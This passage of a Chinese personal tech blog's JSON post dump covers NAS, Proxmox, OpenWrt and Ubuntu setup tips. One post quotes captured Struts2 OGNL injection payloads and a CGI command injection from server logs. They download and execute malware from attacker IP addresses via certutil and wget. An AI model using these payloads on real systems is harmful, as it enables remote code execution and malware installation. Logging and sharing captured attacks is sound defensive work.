https://pan.aoaoao.me/ , 'http' must be included in the front and '/' must be included at the end): //网站域名， 必须 http:// 或者 https:// 开头， / 结尾 安装完毕 123456# Congratulations! Cloudreve has been installed successfully.# Here's some informatioin about yor Cloudreve:# Homepage: 刚才输入的地址/ //首页地址# Admin Panel: 刚才输入的地址/Admin //后台地址# Default username: admin@cloudreve.org //管理员账号# Default password: admin //管理员密码 备注 如果可以打开首页但是其他页面都无法访问，记得开启 apache2 伪静态 1234sudo a2enmod rewritesudo service apache2 restart# 替换 AllowOverride None -&gt; AllowOverride Allsudo nano /etc/apache2/apache2.conf","categories":[{"name":"NAS","slug":"NAS","permalink":"https://blog.110.sh/categories/NAS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"NAS","slug":"NAS","permalink":"https://blog.110.sh/tags/NAS/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://blog.110.sh/tags/ubuntu/"}]},{"title":"PVE 安装配置","slug":"pve-setup","date":"2019-04-13T15:05:13.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/04/13/pve-setup/","link":"","permalink":"https://blog.110.sh/2019/04/13/pve-setup/","excerpt":"","text":"PVE 安装配置常见的 PVE 安装配置我就不说了 移除 PVE 企业源12# 还是不要删除了mv /etc/apt/sources.list.d/pve-enterprise.list /etc/apt/sources.list.d/pve-enterprise.list.bak 去除订阅提示 6.X1sed -i \"s/checked_command: function(orig_cmd) &#123;/checked_command: function(orig_cmd) &#123;return;/g\" /usr/share/javascript/proxmox-widget-toolkit/proxmoxlib.js 硬盘直通1234# 获取硬件ID，找到 硬盘，一般以 ata- 开头ls -l /dev/disk/by-id/# qm set 虚拟机ID --硬盘类型和编号 硬件IDqm set 1000 --sata0 /dev/disk/by-id/ata-WDC_WD3200AAJS-00L7A0_WD-WMAV2C195655","categories":[{"name":"Proxmox VE","slug":"Proxmox-VE","permalink":"https://blog.110.sh/categories/Proxmox-VE/"}],"tags":[{"name":"pve","slug":"pve","permalink":"https://blog.110.sh/tags/pve/"},{"name":"Proxmox VE","slug":"Proxmox-VE","permalink":"https://blog.110.sh/tags/Proxmox-VE/"}]},{"title":"openmediavault 安装 omv-extras","slug":"install-omv-extras","date":"2019-04-13T14:57:45.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/04/13/install-omv-extras/","link":"","permalink":"https://blog.110.sh/2019/04/13/install-omv-extras/","excerpt":"","text":"安装 omv-extras ssh 到 omv 上 1wget -O - http://omv-extras.org/install | bash 刷新 Web UI","categories":[{"name":"openmediavault","slug":"openmediavault","permalink":"https://blog.110.sh/categories/openmediavault/"}],"tags":[{"name":"omv-extras","slug":"omv-extras","permalink":"https://blog.110.sh/tags/omv-extras/"},{"name":"omv","slug":"omv","permalink":"https://blog.110.sh/tags/omv/"},{"name":"openmediavault","slug":"openmediavault","permalink":"https://blog.110.sh/tags/openmediavault/"}]},{"title":"Windows 链接匿名 SMB","slug":"windows-connect-anonymous-smb","date":"2019-04-13T14:43:28.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2019/04/13/windows-connect-anonymous-smb/","link":"","permalink":"https://blog.110.sh/2019/04/13/windows-connect-anonymous-smb/","excerpt":"","text":"Windows 链接匿名 SMB 共享Windows 10 1709 后默认不允许匿名链接 SMB 解决办法是： 启用或关闭 Windows 功能 勾选 “SMB 1.0/CIFS 文件共享支持” 保存并重启电脑即可","categories":[{"name":"Windows","slug":"Windows","permalink":"https://blog.110.sh/categories/Windows/"}],"tags":[{"name":"SMB","slug":"SMB","permalink":"https://blog.110.sh/tags/SMB/"},{"name":"Windows","slug":"Windows","permalink":"https://blog.110.sh/tags/Windows/"}]},{"title":"删除空文件夹，空文件，小文件","slug":"remove-empty-directory-file-and-tiny-file","date":"2019-03-25T02:57:08.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/03/25/remove-empty-directory-file-and-tiny-file/","link":"","permalink":"https://blog.110.sh/2019/03/25/remove-empty-directory-file-and-tiny-file/","excerpt":"删除空文件夹","text":"删除空文件夹 Linux 同样适用于 WSL 12345678# 删除空文件夹find . -type d -empty -delete# 删除空文件find . -type f -empty -delete# 删除空文件夹和文件find . -type f,d -empty -delete# 删除大小小于 1 KB 的文件find . -type f -size -1k -delete Windows 保存下面的任意内容为 clear.bat ，然后到想要清理空文件夹的地方双击打开就可以了 123rem 删除空文件夹@echo offfor /f \"tokens=*\" %%i in ('dir/s/b/ad^|sort /r') do rd \"%%i\" 123rem 删除空文件@echo offfor /r %%F in (*) do if %%~zF==0 del \"%%F\" 123rem 删除文件大小小于 1 KB 的@echo offfor /r %%F in (*) do if %~zF LSS 1024 del \"%%F\"","categories":[{"name":"Code","slug":"Code","permalink":"https://blog.110.sh/categories/Code/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://blog.110.sh/tags/Windows/"}]},{"title":"修复 SpaceVim 在 Mac 系统上的乱码","slug":"fix-spacevim-garbled-text-in-macos","date":"2019-03-13T07:49:15.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/03/13/fix-spacevim-garbled-text-in-macos/","link":"","permalink":"https://blog.110.sh/2019/03/13/fix-spacevim-garbled-text-in-macos/","excerpt":"","text":"修复 SpaceVim 在 Mac 系统上的乱码在 Mac iTerm 上，可能会出现 文字乱码的问题，即使你安装了 Powerlines 系列字体也一样，其原因是缺少 Hack Nerd 字体。 修复办法首先需要安装字体 12brew tap caskroom/fontsbrew cask install font-hack-nerd-font 然后设置 iTerm Profile – Text – 勾选 Use different font for non-ASCII text – 在出现的 non-ASCII 中选择 Hack Nerd 字体 重启 iTerm","categories":[{"name":"Mac","slug":"Mac","permalink":"https://blog.110.sh/categories/Mac/"}],"tags":[{"name":"vim","slug":"vim","permalink":"https://blog.110.sh/tags/vim/"},{"name":"mac","slug":"mac","permalink":"https://blog.110.sh/tags/mac/"}]},{"title":"保存 Git 认证信息","slug":"save-git-auth-info","date":"2019-03-12T16:31:10.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/03/13/save-git-auth-info/","link":"","permalink":"https://blog.110.sh/2019/03/13/save-git-auth-info/","excerpt":"","text":"保存 Git 认证信息如果经常 git pull 而且总是要输入密码信息一定很麻烦 代码12345cd codedir # 跳转到代码目录，确保其中有 .git 文件夹git config credential.helper store # 开启密码保存功能git pull # 输入认证信息git pull # 验证是否需要输入认证信息# 结束","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"Git","slug":"Git","permalink":"https://blog.110.sh/tags/Git/"}]},{"title":"修复 the following signatures couldn’t be verified because the public key is not available 错误","slug":"fix-public-key-is-not-available","date":"2019-03-12T16:15:49.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/03/13/fix-public-key-is-not-available/","link":"","permalink":"https://blog.110.sh/2019/03/13/fix-public-key-is-not-available/","excerpt":"","text":"修复 public key is not availablethe following signatures couldn’t be verified because the public key is not available 错误提示：例如： 123Err:6 https://dl.yarnpkg.com/debian stable InReleaseThe following signatures couldn&apos;t be verified because the public key is not available: NO_PUBKEY 23E7166788B63E1E 解决办法：1sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 23E7166788B63E1E PUBKEY 要一致，例如上文中的：23E7166788B63E1E","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/categories/Ubuntu/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"}]},{"title":"有用的的库/包","slug":"awsome-package-or-library","date":"2019-01-09T07:02:00.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/01/09/awsome-package-or-library/","link":"","permalink":"https://blog.110.sh/2019/01/09/awsome-package-or-library/","excerpt":"说明这里全都是我个人整理的，我觉得对我有用的库或者包，大部分都是半成品需要自行开发使用的东西，在自我整理的同时希望能对各位产生帮助。 最后更新于：2019 年 1 月 9 日","text":"说明这里全都是我个人整理的，我觉得对我有用的库或者包，大部分都是半成品需要自行开发使用的东西，在自我整理的同时希望能对各位产生帮助。 最后更新于：2019 年 1 月 9 日 nodejs shipit 通用自动化部署工具，可用在远程/本地服务器上，全自动初始化服务器/安装程序/安装功能 node-ping ping IP、域名 ssh2 SSH 客户端，执行命令、连接服务器、SFTP 等等 scp2 SCP 功能，复制文件、目录 chalk 为命令行输出文字增加颜色 figlet.js 生成英文的 ASCII 画，可在一定程度上自定义字体，对齐方式，风格 inquirer.js 创建交互式的命令行程序，UI 支持 多选/单选/确认/输入/密码 ShellJS 使用 nodejs 本身自带的 API 实现的跨平台的 Shell 功能，提供例如 rm/cp/cd/ls/sed/mkdir 等等命令，非常强大 Puppeteer 与 Chromium 通讯，可以 模拟点击/执行命令/输入/数据拦截修改重放/鼠标模拟/截图 等等功能，完完全全的一个可通过 nodejs 操作一切的浏览器，非常强大 lowdb 非常基础轻量的本地化 JSON 格式的数据库，重点是轻量，简单 cli-spinners 命令行的 spinner 列表，加载动画列表，很有意思 python fabric 用自动化部署工具，可用在远程/本地服务器上，全自动初始化服务器/安装程序/安装功能/文件传输，类似 shipit，不建议使用 fabric2，文档资料太少 wxpy 基于 web 微信的机器人 API，可以实现 机器人/自动控制/自动发消息/加好友/拉群 等等，全由自己开发 better-exceptions 更友好的异常信息显示，好看 python-fire 自动根据函数、类生成 cli 程序 face_recognition 人脸识别库 Requests-HTML 人性化符合语义的 HTML 处理 requests 人性化的符合语义的 HTML 请求 shell 脚本(开箱即用) multi-v2ray 全自动的 v2ray 部署工具，一键生成混淆/配置文件 oh-my-vim 眨眼间配置生成一个酷炫的实用的 vim","categories":[{"name":"Code","slug":"Code","permalink":"https://blog.110.sh/categories/Code/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://blog.110.sh/tags/nodejs/"},{"name":"python","slug":"python","permalink":"https://blog.110.sh/tags/python/"},{"name":"shell","slug":"shell","permalink":"https://blog.110.sh/tags/shell/"},{"name":"package","slug":"package","permalink":"https://blog.110.sh/tags/package/"},{"name":"library","slug":"library","permalink":"https://blog.110.sh/tags/library/"}]},{"title":"安装官方版 LEDE 到 virtualbox","slug":"install-lede-official-on-virtualbox","date":"2019-01-02T17:17:16.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/01/03/install-lede-official-on-virtualbox/","link":"","permalink":"https://blog.110.sh/2019/01/03/install-lede-official-on-virtualbox/","excerpt":"安装官方版 LEDE 到 virtualbox 已放弃 Deprecated,已放弃 Deprecated,已放弃 Deprecated, 已改回我最老的 r8000 merlin 性能虽然差，但免折腾 不知为何我在虚拟机中的 koolshare 版本 lede 有奇怪的问题, 例如当开启 v2ray 时, 每隔 8 小时(怀疑与 DHCP 有关) v2ray 必然短链, 且重启插件无效, 日志中都是疯狂的自动重启, 必须要重启系统(koolshare 版 lede)才可以重新连接上 v2ray, 或者是使用 PC Chrome 登陆不上去 Web 配置界面, 必须开启隐私浏览才能登陆或者换其他浏览器(应该是 Chrome 的锅, 但也不爽), 所以有了安装官方版 LEDE 到 virtualbox 的想法, 这肯定是个大坑.","text":"安装官方版 LEDE 到 virtualbox 已放弃 Deprecated,已放弃 Deprecated,已放弃 Deprecated, 已改回我最老的 r8000 merlin 性能虽然差，但免折腾 不知为何我在虚拟机中的 koolshare 版本 lede 有奇怪的问题, 例如当开启 v2ray 时, 每隔 8 小时(怀疑与 DHCP 有关) v2ray 必然短链, 且重启插件无效, 日志中都是疯狂的自动重启, 必须要重启系统(koolshare 版 lede)才可以重新连接上 v2ray, 或者是使用 PC Chrome 登陆不上去 Web 配置界面, 必须开启隐私浏览才能登陆或者换其他浏览器(应该是 Chrome 的锅, 但也不爽), 所以有了安装官方版 LEDE 到 virtualbox 的想法, 这肯定是个大坑. 安装首先给出官方文档, 我说的不理解的可以去看看. 下载官方镜像 选择最新的 combined-ext4.img.gz 下载 1234cd /tmpwget https://downloads.openwrt.org/snapshots/targets/x86/64/openwrt-x86-64-combined-ext4.img.gz# 解压atool -x openwrt-x86-64-combined-ext4.img.gz 转换为 virtualbox 的硬盘 vdi 格式 12345678# 转换VBoxManage convertfromraw --format VDI openwrt-x86-64-combined-ext4.img openwrt-x86-64-combined-ext4.vdi# Converting from raw image file=\"openwrt-x86-64-combined-ext4.img\" to file=\"openwrt-x86-64-combined-ext4.vdi\"...# Creating dynamic image with size 285736960 bytes (273MB)...# 成功# 如果需要的话，可以修改大小，例如下面的命令是修改大小为 128MBVboxManage modifymedium openwrt-x86-64-combined-ext4.vdi --resize 128 创建虚拟机 起个名字，我的叫 ledeOfficial 选择类型为 Linux 版本选择为 Linux 2.6 / 3.x / 4.x (64-bit) 设置内存，我设置为 2048MB, 官方说 128MB 就足够了 选择硬盘，使用现有的虚拟磁盘, 找到刚解压出来的 vdi 文件 设置虚拟机 设置网卡 1, 选择使用桥接网卡(Bridged Adapter), 选择本机网卡(提供网络) 设置网卡 2, 与上述一样(提供 DHCP 一类) [可选]设置 CPU，越多越好 [可选]设置启动顺序，最好把 软盘，光盘都取消了 启动虚拟机 配置/常用命令 设置网卡 1vi /etc/config/network 我这里支持 IPV6, 如果你那边不支持，记得删掉 v6 的内容 123456789101112131415161718config interface &apos;loopback&apos; option ifname &apos;lo&apos; option proto &apos;static&apos; option ipaddr &apos;127.0.0.1&apos; option netmask &apos;255.0.0.0&apos;config globals &apos;globals&apos; option ula_prefix &apos;fdba:e06d:7c2c::/48&apos;config interface &apos;wan&apos; option ifname &apos;eth0&apos; option proto &apos;static&apos; option ipaddr &apos;192.168.1.20&apos; option netmask &apos;255.255.255.0&apos; option gateway &apos;192.168.1.1&apos; option broadcast &apos;192.168.1.255&apos; option ip6assign &apos;64&apos; option dns &apos;2001:dc7:1000::1 114.114.114.114 2001:4860:4860::8888 8.8.8.8&apos; 更新软件源 1opkg update 替换软件源为 https 123456# 让 openwrt 支持 sslopkg install wget ca-certificates libustream-openssl# 替换sed -i 's/http/https/g' /etc/opkg/distfeeds.conf# 更新软件源opkg update 或者替换源为国内镜像 1sed -i 's_downloads\\.lede-project\\.org_mirrors.ustc.edu.cn/lede_' /etc/opkg/distfeeds.conf 安装 ssh server 官方文档 安装 luci (界面) 官方文档 1234# 安装原版opkg update &amp;&amp; opkg install luci-ssl-openssl libuhttpd-openssl# 安装中文汉化opkg install luci-i18n-base-zh-cn SS 添加源 123456cd /tmpwget http://openwrt-dist.sourceforge.net/packages/openwrt-dist.pubmount -o remount,rw /opkg-key add openwrt-dist.pubecho 'src/gz openwrt_dist http://openwrt-dist.sourceforge.net/packages/base/x86_64' &gt;&gt; /etc/opkg/customfeeds.confecho 'src/gz openwrt_dist_luci http://openwrt-dist.sourceforge.net/packages/luci' &gt;&gt; /etc/opkg/customfeeds.conf 安装软件包 123456# ss，shadowsocks-libev 核心，luci-app-shadowsocks 界面，iptables-mod-tproxy 透明代理opkg install shadowsocks-libev luci-app-shadowsocks iptables-mod-tproxy# DNS 优化# ChinaDNS：解决DNS污染问题，优化DNS解析以提升访问速度# DNS-Forwarder：将 UDP协议的DNS 查询转换为 TCP 协议，避免某些ISP不稳定的UDP查询opkg install ChinaDNS luci-app-chinadns dns-forwarder luci-app-dns-forwarder","categories":[{"name":"router","slug":"router","permalink":"https://blog.110.sh/categories/router/"}],"tags":[{"name":"LEDE","slug":"LEDE","permalink":"https://blog.110.sh/tags/LEDE/"},{"name":"软路由","slug":"软路由","permalink":"https://blog.110.sh/tags/软路由/"},{"name":"virtualbox","slug":"virtualbox","permalink":"https://blog.110.sh/tags/virtualbox/"}]},{"title":"梅林开机自动执行脚本","slug":"merlin-onstart-run-script","date":"2019-01-02T17:17:16.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/01/03/merlin-onstart-run-script/","link":"","permalink":"https://blog.110.sh/2019/01/03/merlin-onstart-run-script/","excerpt":"","text":"梅林开机自动执行脚本 编辑文件 1vi /jffs/scripts/init-start 写入要执行的内容 1234#!/bin/sh# 这里是执行超频到 1400Mhznvram set clkfreq=1400,900nvram commit 设置权限 12chmod a+rx /jffs/scripts/init-start# chmod a+rx /jffs/scripts/*","categories":[{"name":"router","slug":"router","permalink":"https://blog.110.sh/categories/router/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://blog.110.sh/tags/shell/"},{"name":"router","slug":"router","permalink":"https://blog.110.sh/tags/router/"},{"name":"merlin","slug":"merlin","permalink":"https://blog.110.sh/tags/merlin/"}]},{"title":"从HTTP服务日志中获取的有趣内容，疑似exp","slug":"i-got-some-exp","date":"2018-12-16T05:25:28.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/12/16/i-got-some-exp/","link":"","permalink":"https://blog.110.sh/2018/12/16/i-got-some-exp/","excerpt":"目前共四个","text":"目前共四个 12345URL:/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&amp;cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.actionDecode:/$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&apos;struts.valueStack&apos;].context).(#cr=#ct[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;certutil.exe -urlcache -split -f http://111.90.158.225/d/fast.exe c:/fast.exe&amp;cmd.exe /c c:\\\\fast.exe&apos;).getInputStream()))).(#w.close())&#125;/index.action 12345URL:/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&amp;cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.actionDecode:/$&#123;(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;certutil.exe -urlcache -split -f http://111.90.158.225/d/fast.exe c:/fast.exe&amp;cmd.exe /c c:\\\\fast.exe&apos;).getInputStream()))).(#w.close())&#125;/index.action 12345URL:/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27nohup%20uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&amp;&amp;%20chmod%20777%20.loop%20&amp;&amp;%20./.loop)&amp;&amp;(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&amp;&amp;%20chmod%20777%20.loop%20&amp;&amp;%20./.loop)%20%26%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.actionDecode:/$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&apos;struts.valueStack&apos;].context).(#cr=#ct[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;nohup uname --m|grep x86_64 &gt;&gt; /dev/null || (pkill loop ; wget -O .loop http://111.90.158.225/d/ft32 &amp;&amp; chmod 777 .loop &amp;&amp; ./.loop)&amp;&amp;(pkill loop ; wget -O .loop http://111.90.158.225/d/ft64 &amp;&amp; chmod 777 .loop &amp;&amp; ./.loop) &amp;&apos;).getInputStream()))).(#w.close())&#125;/index.action 123456URL:/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27nohup%20uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&amp;&amp;%20chmod%20777%20.loop%20&amp;&amp;%20./.loop)&amp;&amp;(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&amp;&amp;%20chmod%20777%20.loop%20&amp;&amp;%20./.loop)%20%26%%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action/cgi-bin/nobody/Search.cgi?action=cgi_query&amp;ip=google.com&amp;port=80&amp;queryb64str=Lw==&amp;username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://46.29.167.53/z;chmod%20777%20z;sh%20z)&amp;password=adminDecode:/$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&apos;struts.valueStack&apos;].context).(#cr=#ct[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;nohup uname --m|grep x86_64 &gt;&gt; /dev/null || (pkill loop ; wget -O .loop http://111.90.158.225/d/ft32 &amp;&amp; chmod 777 .loop &amp;&amp; ./.loop)&amp;&amp;(pkill loop ; wget -O .loop http://111.90.158.225/d/ft64 &amp;&amp; chmod 777 .loop &amp;&amp; ./.loop) &amp;&apos;).getInputStream()))).(#w.close())&#125;/index.action","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.110.sh/categories/Web/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://blog.110.sh/tags/HTTP/"},{"name":"log","slug":"log","permalink":"https://blog.110.sh/tags/log/"}]},{"title":"Python3 简易多线程HTTP文件服务器","slug":"python3-multithreaded-http-server","date":"2018-11-27T09:37:15.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/11/27/python3-multithreaded-http-server/","link":"","permalink":"https://blog.110.sh/2018/11/27/python3-multithreaded-http-server/","excerpt":"Python 搭建简单文件服务器偶尔我们会需要让别人下载点文件，但是Apache、NGINX都有点过于重了，而实际上使用一条命令即可实简易的文件服务器。 Python3 单线程文件服务器这句代码执行后会绑定所有IP，8000端口，列当前目录 如果文件很小，或者网速很快，则只需要使用这个就足够了 1python3 -m http.server Python3 多线程文件服务器如果文件较大或者网速较、高迸发的情况则需要使用多线程的，防止文件服务器卡死 用法： 1234# 运行在当前目录、8000端口python3 server.py# 运行在 /tmp 目录、8888端口python3 8888 /tmp 保存脚本为 server.py","text":"Python 搭建简单文件服务器偶尔我们会需要让别人下载点文件，但是Apache、NGINX都有点过于重了，而实际上使用一条命令即可实简易的文件服务器。 Python3 单线程文件服务器这句代码执行后会绑定所有IP，8000端口，列当前目录 如果文件很小，或者网速很快，则只需要使用这个就足够了 1python3 -m http.server Python3 多线程文件服务器如果文件较大或者网速较、高迸发的情况则需要使用多线程的，防止文件服务器卡死 用法： 1234# 运行在当前目录、8000端口python3 server.py# 运行在 /tmp 目录、8888端口python3 8888 /tmp 保存脚本为 server.py 12345678910111213141516171819202122232425262728293031323334import sys, os, socketfrom socketserver import ThreadingMixInfrom http.server import SimpleHTTPRequestHandler, HTTPServerHOST = socket.gethostname()class ThreadingSimpleServer(ThreadingMixIn, HTTPServer): pass'''这里设置监听端口'''if sys.argv[1:]: PORT = int(sys.argv[1])else: PORT = 8000'''这里设置工作目录，如果不设置则使用脚本文件所在目录'''if sys.argv[2:]: os.chdir(sys.argv[2]) CWD = sys.argv[2]else: CWD = os.getcwd()server = ThreadingSimpleServer(('0.0.0.0', PORT), SimpleHTTPRequestHandler)print(\"目录：\", CWD, \"地址：\", HOST, \"端口\", PORT)try: while 1: sys.stdout.flush() server.handle_request()except KeyboardInterrupt: print(\"\\n用户终止运行.\")","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.110.sh/categories/Python/"}],"tags":[{"name":"实用","slug":"实用","permalink":"https://blog.110.sh/tags/实用/"},{"name":"Python3","slug":"Python3","permalink":"https://blog.110.sh/tags/Python3/"}]},{"title":"我的 Ubuntu 系统常用配置","slug":"my-ubuntu-system-configuration","date":"2018-11-22T20:11:09.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/11/23/my-ubuntu-system-configuration/","link":"","permalink":"https://blog.110.sh/2018/11/23/my-ubuntu-system-configuration/","excerpt":"我的 Ubuntu 系统常用配置 编译 Go 代码时记得拿到 tmp 目录，否则会有本机信息 最后更新于 2019 年 1 月 3 日","text":"我的 Ubuntu 系统常用配置 编译 Go 代码时记得拿到 tmp 目录，否则会有本机信息 最后更新于 2019 年 1 月 3 日 常用/必备 恢复 ssh 秘钥与各种信息(我的私有配置) 1ln -s `pwd`/ssh $HOME/.ssh 替换 apt 源为 mirrors.ustc.edu.cn 1sudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list 如果你在安装时选择的语言不是英语，默认的源地址通常不是 http://archive.ubuntu.com/ ， 而是 http://.archive.ubuntu.com/ubuntu/ ，如 http://cn.archive.ubuntu.com/ubuntu/ ， 此时只需将上面的命令进行相应的替换即可，即 sudo sed -i ‘s/cn.archive.ubuntu.com/mirrors.ustc.edu.cn/g’ /etc/apt/sources.list 。 更新系统 123sudo apt update &amp;&amp; sudo apt upgrade -y &amp;&amp; sudo apt autoremove -y# 创建命令别名echo \"alias upgrade='sudo apt update &amp;&amp; sudo apt upgrade -y &amp;&amp; sudo apt autoremove -y'\" &gt;&gt; $HOME/.zshrc 移除开机新闻广告 (好像 18.04 才有) 1sudo sed -i 's/ENABLED=1/ENABLED=0/g' /etc/default/motd-news 替换 python pip 源为 mirrors.ustc.edu.cn 123456mkdir $HOME/.config/pip/ -pcat &gt; $HOME/.config/pip/pip.conf &lt;&lt;END[global]index-url = https://mirrors.ustc.edu.cn/pypi/web/simpleformat = columnsEND 为旧版 Ubuntu 系统添加 apt Python 源 123sudo add-apt-repository ppa:deadsnakes/ppasudo apt-get update# 现在就可以执行安装 apt install python3.7 这样的操作了 安装必备基本工具 1sudo apt update &amp;&amp; sudo apt install git curl wget -y 安装 oh-my-zsh 12345sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"# 替换默认 shell 为 zshchsh --shell `which zsh`# 直接打开 zsh shellzsh 安装 bat (用于替换 cat 增加代码高亮等供能) 123wget https://github.com/sharkdp/bat/releases/download/v0.9.0/bat-musl_0.9.0_amd64.deb &amp;&amp; sudo dpkg -i bat-musl_0.9.0_amd64.deb &amp;&amp; rm bat-musl_0.9.0_amd64.deb# 创建别名echo 'alias cat=\"bat\"' &gt;&gt; $HOME/.zshrc 安装 fzf (用于替换 history 